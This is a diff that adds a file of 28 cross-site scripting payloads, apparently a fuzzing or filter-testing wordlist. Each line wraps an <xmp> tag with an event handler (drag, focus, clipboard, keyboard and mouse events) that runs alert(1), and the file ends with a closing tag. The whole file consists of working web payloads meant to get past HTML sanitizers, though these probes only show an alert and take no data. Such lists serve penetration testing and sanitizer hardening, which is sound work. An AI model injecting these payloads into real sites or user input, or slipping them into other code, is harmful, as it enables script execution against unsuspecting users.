@@ -1,0 +1,29 @@
+<xmp draggable="true" ondrag="alert(1)">test</xmp>
+<xmp draggable="true" ondragend="alert(1)">test</xmp>
+<xmp draggable="true" ondragenter="alert(1)">test</xmp>
+<xmp draggable="true" ondragleave="alert(1)">test</xmp>
+<xmp draggable="true" ondragstart="alert(1)">test</xmp>
+<xmp id=x tabindex=1 onactivate=alert(1)></xmp>
+<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>
+<xmp id=x tabindex=1 onfocus=alert(1)></xmp>
+<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
+<xmp onbeforecopy="alert(1)" contenteditable>test</xmp>
+<xmp onbeforecut="alert(1)" contenteditable>test</xmp>
+<xmp onbeforepaste="alert(1)" contenteditable>test</xmp>
+<xmp onclick="alert(1)">test</xmp>
+<xmp oncontextmenu="alert(1)">test</xmp>
+<xmp oncopy="alert(1)" contenteditable>test</xmp>
+<xmp oncut="alert(1)" contenteditable>test</xmp>
+<xmp ondblclick="alert(1)">test</xmp>
+<xmp onkeydown="alert(1)" contenteditable>test</xmp>
+<xmp onkeypress="alert(1)" contenteditable>test</xmp>
+<xmp onkeyup="alert(1)" contenteditable>test</xmp>
+<xmp onmousedown="alert(1)">test</xmp>
+<xmp onmouseenter="alert(1)">test</xmp>
+<xmp onmouseleave="alert(1)">test</xmp>
+<xmp onmousemove="alert(1)">test</xmp>
+<xmp onmouseout="alert(1)">test</xmp>
+<xmp onmouseover="alert(1)">test</xmp>
+<xmp onmouseup="alert(1)">test</xmp>
+<xmp onpaste="alert(1)" contenteditable>test</xmp>
+</xmp>
